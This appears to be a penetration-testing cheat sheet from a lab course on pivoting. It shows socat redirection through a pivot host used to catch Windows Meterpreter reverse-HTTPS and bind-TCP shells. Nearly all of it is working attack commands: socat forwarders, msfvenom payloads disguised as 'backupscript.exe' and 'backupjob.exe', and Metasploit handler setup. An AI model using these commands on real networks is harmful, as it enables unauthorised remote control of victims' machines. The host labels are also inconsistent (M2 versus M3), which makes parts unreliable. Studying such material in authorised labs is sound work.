## Socat Redirection with a Reverse Shell
```bash
# Socat Redirection : remote port forwarding without ssh auth 
# HACKER: 10.129.202.64, M1(ubuntu):10.129.202.65|172.X.X.1 , M2:172.X.X.2(windows)
# (HACKER:80)<==[socket_redirection](<M1>:8080)<==(<M2>)

## on Machine_2 (pivot host)
socat TCP4-LISTEN:8080,fork TCP4:<HACKER-IP>:80  # Starting Socat Listener

## on our attacker host
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<M1-IP> -f exe -o backupscript.exe LPORT=8080 
sudo msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set lhost 0.0.0.0
set lport 80
run

## on M3 (compromised host we wan access)
.\backupscript.exe # excute the payload
```
## Socat Redirection with a Bind Shell
```bash
# HACKER: 10.129.202.64, M1:10.129.202.65|172.X.X.1 , M2:172.X.X.2
# (HACKER:80)==>[socket_redirection](<M1(ubuntu)>:8080)==>(<M2(windows)>:8443)

# On machine_2 (pivot host)
socat TCP4-LISTEN:8080,fork TCP4:<M2-IP>:8443

# on Attacker host (hcaker)
msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupjob.exe LPORT=8443
use exploit/multi/handler
set payload windows/x64/meterpreter/bind_tcp
set RHOST <M1-IP>
set LPORT 8080
run

# On M2 (machine we want access)
.\backupjob.exe
```
![socket with bind shell](https://academy.hackthebox.com/storage/modules/158/55.png)